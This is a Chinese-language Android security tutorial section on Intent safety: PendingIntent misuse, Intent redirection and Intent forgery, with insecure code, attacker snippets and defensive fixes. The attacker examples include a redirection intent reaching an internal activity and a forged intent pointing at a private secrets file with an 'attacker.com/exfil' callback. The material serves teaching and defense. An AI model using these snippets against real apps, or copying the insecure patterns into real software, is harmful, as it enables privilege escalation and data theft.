# Intent安全机制

### 6.1 显式Intent与隐式Intent

| 特性 | 显式Intent | 隐式Intent |
|------|-----------|-----------|
| 目标指定 | setComponent/setClass/setPackage | action/category/data |
| 安全性 | 高（指定目标） | 低（可能被劫持） |
| 适用场景 | 应用内部组件间通信 | 跨应用功能调用 |
| 劫持风险 | 极低 | 高（需防护） |

### 6.2 PendingIntent安全

PendingIntent是一种特殊的Intent，允许其他应用以本应用的身份执行操作。这引入了严重的安全风险：

**风险：PendingIntent以调用者身份执行**

```java
// 不安全：使用空Intent创建PendingIntent
PendingIntent pi = PendingIntent.getActivity(
    context,
    requestCode,
    new Intent(),  // 空Intent！
    PendingIntent.FLAG_UPDATE_CURRENT
);
// 攻击者可以填充恶意Intent，以本应用身份执行
```

**攻击场景**

```
1. 应用A创建PendingIntent（空Intent，但以A的身份）
2. 应用A将PendingIntent传递给应用B
3. 应用B填充恶意Intent到PendingIntent
4. 恶意Intent以应用A的身份执行
5. 攻击者获得了A的权限
```

**安全实践**

```java
// 安全：使用显式Intent创建PendingIntent
Intent explicitIntent = new Intent(context, TargetActivity.class);
explicitIntent.setAction("com.example.SPECIFIC_ACTION");

PendingIntent pi = PendingIntent.getActivity(
    context,
    requestCode,
    explicitIntent,  // 显式指定目标！
    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE  // Android 12+要求IMMUTABLE
);

// Android 12+必须指定MUTABLE或IMMUTABLE标志
// 优先使用IMMUTABLE
PendingIntent immutablePi = PendingIntent.getActivity(
    context, requestCode, explicitIntent,
    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
);
```

### 6.3 Intent重定向攻击

Intent重定向（Intent Redirection）是指应用接收外部Intent中的内嵌Intent，并将其作为内部Intent转发执行：

```java
// 不安全：转发接收到的内嵌Intent
public class RedirectActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent received = getIntent();
        // 提取内嵌Intent并直接启动
        Intent innerIntent = (Intent) received.getParcelableExtra("redirect_intent");
        if (innerIntent != null) {
            startActivity(innerIntent);  // 危险！以本应用身份执行
        }
    }
}
```

攻击者可以构造Intent以本应用身份访问内部未暴露的组件：

```java
// 攻击者代码
Intent innerIntent = new Intent();
innerIntent.setClassName("com.example.victim", ".InternalSecretActivity");
innerIntent.putExtra("admin", true);

Intent attackIntent = new Intent();
attackIntent.setClassName("com.example.victim", ".RedirectActivity");
attackIntent.putExtra("redirect_intent", innerIntent);
startActivity(attackIntent);
```

**防御措施**

```java
// 防御：验证内嵌Intent，不转发不可信Intent
public class SafeRedirectActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent received = getIntent();

        // 不从外部Intent提取Intent并执行
        // 如必须转发，验证目标组件
        if (received.hasExtra("redirect_intent")) {
            Intent innerIntent = received.getParcelableExtra("redirect_intent");
            // 验证目标是合法的可暴露组件
            if (isAllowedTarget(innerIntent)) {
                startActivity(innerIntent);
            } else {
                Log.w(TAG, "Blocked intent redirection attempt");
            }
        }
    }

    private boolean isAllowedTarget(Intent intent) {
        ComponentName target = intent.getComponent();
        if (target == null) return false;
        // 白名单检查
        Set<String> allowed = new HashSet<>(Arrays.asList(
            "com.example.victim.PublicActivity",
            "com.example.victim.ShareActivity"
        ));
        return allowed.contains(target.getClassName());
    }
}
```

### 6.4 Intent伪造攻击

攻击者构造恶意Intent发送给目标应用的暴露组件，携带恶意参数：

```java
// 攻击者构造恶意Intent
Intent malicious = new Intent("com.example.action.PROCESS");
malicious.putExtra("url", "file:///data/data/com.example/files/secrets");
malicious.putExtra("callback", "http://attacker.com/exfil");
startActivity(malicious);
```

---

---

